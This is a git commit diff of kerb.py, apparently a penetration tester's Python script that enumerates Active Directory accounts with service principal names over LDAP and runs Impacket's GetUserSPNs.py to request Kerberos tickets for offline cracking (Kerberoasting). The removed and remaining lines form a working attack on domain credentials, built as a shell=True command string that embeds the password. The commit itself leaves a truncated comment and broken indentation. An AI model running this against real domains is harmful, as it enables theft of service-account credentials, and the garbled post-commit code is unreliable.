2ea6fbe0904b87aef323cd3e8dd0798975ba1124
AJ Hammond <aj.hammond@praetorian.com>
2024-03-15 23:51:19 -0400

    asdf

--- kerb.py
+++ kerb.py
@@ -3,25 +3,9 @@ from ldap3 import Server, Connection, SUBTREE
 
 def find_and_kerberoast_objects(username, password, domain, dc_ip):
     try:
-        # Connect to the Domain Controller via LDAP
-        server = Server(dc_ip, port=389)
-        conn = Connection(server, user=f"{domain}\\{username}", password=password, authentication='NTLM', auto_bind=True)
-
-        # Search for objects with SPNs set
-        search_base = 'DC=' + ',DC='.join(domain.split('.'))
-        search_filter = '(servicePrincipalName=*)'
-        attributes = ['sAMAccountName', 'servicePrincipalName']
-        conn.search(search_base, search_filter, SUBTREE, attributes=attributes)
-
-        # Parse search result and kerberoast objects
-        for entry in conn.entries:
-            sAMAccountName = entry['sAMAccountName'].value
-            print(f"Kerberoasting {sAMAccountName}...")
-            cmd = f"GetUserSPNs.py -request -dc-ip {dc_ip} -outputfile krbtickets.txt -u {domain}/{username}:{password} {sAMAccountName}"
+        # Connect to the Domain Controlle
+            cmd = f"GetUserSPNs.py -request -dc-ip {dc_ip} -outputfile krbtickets.txt -u {domain}/{username}:{password}"
             subprocess.run(cmd, shell=True)
-
-        conn.unbind()
-
     except Exception as e:
         print(f"Error while searching for kerberoastable objects or Kerberoasting: {e}")
 
